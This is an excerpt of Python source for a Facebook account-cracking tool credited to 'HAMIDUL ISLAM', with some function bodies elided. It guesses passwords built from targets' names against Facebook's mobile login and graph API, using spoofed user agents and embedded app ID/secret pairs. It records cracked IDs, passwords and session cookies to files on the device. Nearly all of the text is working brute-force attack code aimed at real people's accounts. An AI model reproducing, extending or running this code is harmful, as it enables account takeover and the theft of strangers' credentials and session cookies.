...
def logo():
    os.system("clear")
    print(f"""\x1b[1;97m{W}
 db   db  .d8b.  .88b  d88. d888888b d8888b. db    db db      
88   88 d8' `8b 88'YbdP`88   `88'   88  `8D 88    88 88      
88ooo88 88ooo88 88  88  88    88    88   88 88    88 88      
88~~~88 88~~~88 88  88  88    88    88   88 88    88 88      
88   88 88   88 88  88  88   .88.   88  .8D 88b  d88 88booo. 
YP   YP YP   YP YP  YP  YP Y888888P Y8888D' ~Y8888P' Y88888P 
\t   \033[31;42mHAMIDUL  ISLAM\33[0;m\__ðŸ˜˜ðŸ˜ˆ
{40*"="} \x1b[1;97m
  [\x1b[1;95m+\x1b[1;97m] AUTHOR : HAMIDUL  ISLAM
  [\x1b[1;95m+\x1b[1;97m] GITHUB : HAMIDUL143        
  [\x1b[1;95m+\x1b[1;97m] FACEBOOK : Alex Noyon Chowdhury  
  [\x1b[1;95m+\x1b[1;97m] VERSION : {0.1}
{40*"="}\x1b[1;97m""")


def Main():
	logo()
	print(f' {W}[{G}1{W}]{W}\033[38;5;46m[{G}FILE{W}]');print(f' {W}[{G}2{W}]{W}\033[38;5;46mCRACK [{G}RANDOM STORE{W}]');print(f' {W}[{G}3{W}]{W}\033[38;5;46mCRACK [{G}GMAIL{W}]');print(f' {W}[{G}4{W}]{W}\033[38;5;46mCRACK\033[38;5;46m[{G}USERNAME{W}]') #;print(f' {W}[{G}E{W}]{W} CRACK [{G}UID{W}]')
	line()
...
def normalfl(id,psd,name,tid):
	...
	try:
		...
		ln = fn
	for pxw in psd:
		sys.stdout.write(f'\r\r{BG}[{W}HAMIDUL -M1{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
		...
		headerx={'Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','referer': 'https://m.facebook.com/?_se_imp=0lUriVenQPHCmwvqF', 'sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-model': '"RMX3201"', 'sec-ch-ua-platform': '"Android"', 'sec-ch-ua-platform-version': '"11.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': ua}
		...
		if 'c_user' in logx:
			...
			print(f'\r\r{G}[HAMIDUL -OK] {id} | {psw}{W}')
			ok.append(id)
			if 'y' in cokix:
				print(f'\r  {BG}[{W}Cookie{BG}]{E} : {G}{kuki}{W}');print(f"{W}{40*'-'}{E}")
			open('/sdcard/HAMIDUL -FILE-OK.txt', 'a').write(id+' | '+psw+'  ------------>>>'+coki+"\n")
			break
		elif twfx in str(logx):
			print(f'\r\r{S}[HAMIDUL -2F] {id} | {psw}{W}')
			open('/sdcard/HAMIDUL -FILE-2F.txt', 'a').write(id+' | '+psw+"\n")
			twf.append(id)
			break
			...
			if 'y' in cpx:
				print(f'\r\r{R}[HAMIDUL -CP] {id} | {psw}{W}')
			open('/sdcard/HAMIDUL -FILE-CP.txt', 'a').write(id+' | '+psw+"\n")
			cp.append(id)
			break
		else:continue
	lop+=1
def graphfl(id,psd,name,tid):
	...
	try:
		...
		ln = fn
	for pxw in psd:
		sys.stdout.write(f'\r\r{BG}[{W}HAMIDUL -M2{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
		psw = pxw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
		ua=ua1()
...
def graphfl2(id,psd,name,tid):
	...
	try:
		...
		ln = fn
	for pxw in psd:
		sys.stdout.write(f'\r\r{BG}[{W}HAMIDUL -M3{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
		psw = pxw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
		ua=ua3()
		apk = ['438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28', '350685531728|62f8ce9f74b12f84c123cc23437a4a32', '6628568379|c1e620fa708a1d5696fb991c1bde5662', '1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae', '1348564698517390|007c0a9101b9e1c8ffab727666805038']
		...
		if 'Please Confirm Email' in logx:
			...
			if 'y' in cpx:
				print(f'\r\r{R}[HAMIDUL -CP] {id} | {psw}{W}');print(ua)
			open('/sdcard/HAMIDUL -FILE-CP.txt', 'a').write(id+' | '+psw+"\n")
			cp.append(id)
			break
		else:continue
...
def nrmlrm(id,psd,tid,mytd):
	...
	for psw in psd:
		...
		if 'c_user' in lcki:
			...
			iid = coki[151:166]
			print(f'\r\r{G}[HAMIDUL -OK] {iid} | {psw}{W}')
			if 'y' in cokix:
				print(f'\r\r{R}[{G}Cookie{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			ok.append(id)
			open('/sdcard/HAMIDUL -OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			break
		elif 'checkpoint' in lcki:
			coki=";".join([key+"="+value for key,value in session.Cookie.get_dict().items()])
			iid = coki[141:156]
			if 'y' in cpx:
				print(f'\r\r{R}[HAMIDUL -CP] {iid} | {psw}{W}')
			cp.append(id)
			open('/sdcard/HAMIDUL -CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
def graphrm(id,psd,tid):
	...
	for psw in psd:
		...
		if 'session_key' in lo:
			...
			print(f'\r\r{S}[HAMIDUL -2F] {iid} | {psw}{W}')
			open('/sdcard/HAMIDUL -CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
...
def apirm(id,psd,tid):
	...
	for psw in psd:
		...
		if 'session_key' in jsn:
			print(f'\r\r{G}[HAMIDUL -OK] {iid} | {psw}{W}')
			ok.append(id);open('/sdcard/HAMIDUL -OK.txt', 'a').write(iid+' | '+psw+' | '+id+'\n') #+'  ------------>>>'+coki+"\n")
			break
		elif 'www.facebook.com' in jsn['error_msg']:
			if 'y' in cpx:
				print(f'\r\r{R}[HAMIDUL -CP] {id} | {psw}{W}')
			cp.append(id)
			open('/sdcard/HAMIDUL -CP.txt', 'a').write(id+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
##################
